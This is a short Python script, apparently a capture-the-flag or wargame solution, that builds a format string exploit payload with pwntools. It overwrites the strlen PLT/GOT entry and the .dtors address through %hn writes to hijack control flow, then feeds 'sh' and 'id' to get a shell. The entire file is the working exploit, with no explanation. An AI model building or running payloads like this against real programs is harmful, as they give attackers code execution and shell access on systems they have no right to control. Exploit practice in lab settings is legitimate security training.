#!/usr/bin/env python

from pwn import *
import struct

def pI(addr):
    return struct.pack('<I', addr)

strlen_plt  = 0x08049a54
dtors_addr  = 0x08049934

payload = b'AA'
payload += p32(strlen_plt + 2)  #12
payload += p32(strlen_plt)      #13
payload += p32(dtors_addr)      #14

payload += b'%' + str(0x0804-32).encode() + b'x'
payload += b'%12$hn'

payload += b'%' + str(0x8490-0x0804).encode() + b'x'
payload += b'%13$hn'

payload += b'%' + str(0x85ed-0x8490).encode() + b'x'
payload += b'%14$hn'

payload += b'\n'

payload += b'sh'
payload += b'\n'

payload += b'id'
payload += b'\n'

print(payload)
